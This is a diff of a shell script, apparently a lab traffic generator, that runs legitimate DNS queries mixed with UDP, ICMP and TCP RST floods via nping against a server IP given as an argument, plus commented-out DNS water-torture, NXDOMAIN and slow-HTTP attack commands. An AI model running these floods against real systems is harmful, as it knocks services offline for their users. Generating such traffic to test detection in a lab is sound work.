@@ -1,7 +1,7 @@
 #!/bin/sh
 # Christopher Gray
-# Version 0.2.2
-#  11-7-18
+# Version 0.2.3
+#  11-10-18
 
 if [ -z "$1" ]
 then
@@ -11,7 +11,6 @@ else
       server_ip=$1
       echo "Server is set to $server_ip \r\n"
 fi
-
 
 if [ -z "$2" ]
 then
@@ -25,17 +24,8 @@ fi
 echo "Running Legitmate DNS Traffic... \r\n "
 sudo ./gen_legit_dns_traffic.sh $server_ip $queries_ps &>/dev/null &
 
-
-
 echo "Running UDP Floods... \r\n "
 sudo ./gen_udp_floods.sh $server_ip  &>/dev/null &
-
-#------ Attack traffic ----------
-#echo "Running NX Domain attack python script... \r\n "
-#sudo python attack_dns_nxdomain.py $server_ip example.com 10000 &>/dev/null &
-
-#echo "Running DNS Water Torture attack against server"
-#sudo ./attack_dns_watertorture_wget.sh $server_ip  &>/dev/null &
 
 #-----------------------------------------------------------------------------------------------------------------
 RATE=5000
@@ -62,11 +52,17 @@ sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT 2> /
 
 echo "Performing a RST Flood on TCP towards SSH \r\n "
 sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT 2> /dev/null &
-
 #-----------------------------------------------------------------------------------------------------------------
 
-#--- Webflow -----
+#------ Attack traffic ----------
+#echo "Running NX Domain attack python script... \r\n "
+#sudo python attack_dns_nxdomain.py $server_ip example.com 10000 &>/dev/null &
+#echo "Running DNS Water Torture attack against server"
+#sudo ./attack_dns_watertorture_wget.sh $server_ip  &>/dev/null &
+
+#--- web attacks -----
 #echo "Performing a Slow HTTP Test script against webserver \r\n "
 #sudo ./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://$server_ip/resources/loginform.html -x 10 -p 3 2> /dev/null &
 #sudo ./gen_ab.sh $server_ip &>/dev/null &
+
 echo "DONE \r\n \r\n"
